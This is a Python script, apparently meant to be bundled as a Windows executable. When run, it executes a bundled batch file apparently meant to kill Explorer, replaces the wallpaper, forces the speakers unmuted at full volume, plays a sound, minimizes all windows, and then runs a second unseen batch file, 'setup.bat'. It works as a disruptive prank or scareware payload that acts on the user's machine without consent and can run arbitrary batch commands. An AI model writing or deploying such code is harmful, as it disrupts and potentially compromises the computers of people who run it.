import os
import ctypes
import time
import subprocess
import winsound
import sys
import threading
from PIL import Image

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


image_path = resource_path("wallpaper.png")
batch_script_path = resource_path("setup.bat")
kill_we_script = resource_path("we.bat")
sound_file_path = resource_path("sound.wav")

def minimize_all_windows():
    def enum_handler(hwnd, lParam):
        if ctypes.windll.user32.IsWindowVisible(
            hwnd
        ) and not ctypes.windll.user32.IsIconic(hwnd):
            ctypes.windll.user32.ShowWindow(hwnd, 6)
        return True

    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong, ctypes.c_ulong)
    enum_handler_type = WNDENUMPROC(enum_handler)
    ctypes.windll.user32.EnumWindows(enum_handler_type, None)

def set_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    is_muted = volume.GetMute()
    if is_muted:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

def set_wallpaper(image_path):
    try:
        image = Image.open(image_path)
        screen_width, screen_height = image.size
        image = image.resize((screen_width, screen_height), resample=Image.BICUBIC)
        if getattr(sys, "frozen", False):
            temp_file_path = os.path.join(sys._MEIPASS, "temp_wallpaper.bmp")
        else:
            temp_file_path = os.path.join(
                os.path.dirname(__file__), "temp_wallpaper.bmp"
            )
        image.save(temp_file_path, "BMP")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_file_path, 0)
    except Exception as e:
        print(f"Error setting wallpaper: {e}")


def run_batch_script(batch_script_path):
    subprocess.run(batch_script_path, shell=True)


def play_sound(sound_file_path):
    winsound.PlaySound(sound_file_path, winsound.SND_FILENAME)

run_batch_script(kill_we_script)
set_wallpaper(image_path)
set_volume()
sound_thread = threading.Thread(target=play_sound, args=(sound_file_path,))
sound_thread.start()
time.sleep(3)
minimize_all_windows()
time.sleep(5)
run_batch_script(batch_script_path)